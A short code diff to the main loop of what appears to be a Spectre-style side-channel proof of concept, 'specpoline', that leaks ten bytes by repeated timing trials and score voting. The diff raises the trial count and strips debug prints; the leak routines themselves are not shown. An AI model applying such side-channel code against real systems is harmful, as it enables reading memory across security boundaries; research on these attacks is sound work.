@@ -65,34 +65,19 @@ int main()
     unsigned int off=0;
     int bytes[10];
 
-    
-    /*leak(0);
-    leak(1);
-    for (int j = 0; j < 256; j++) { if (j % 16 == 0) printf("\n"); printf("  %3d", timings[j]); }
-    printf("\n\n");
-    find_vals(scores);
-    for (int j = 0; j < 256; j++) { if (j % 16 == 0) printf("\n"); printf("  %3d", scores[j]); }
-    return 1;
-*/
-
     for (; off < 10; off++)
     {
         memset(scores, 0, sizeof(scores));
         i = 0;
+        
         /* Test specpoline */
-        while (i++ < 1000)
+        while (i++ < 2000)
         {    
           leak(off);
           find_vals(scores);
         }
 
-        //for (int j = 0; j < 256; j++) printf("  %d", scores[j]);
-        
-
         bytes[off] = find_max(scores);
-
-        //printf("Voted for %x\n", bytes[off]);
-        //scanf("%*c");
     }
 
 
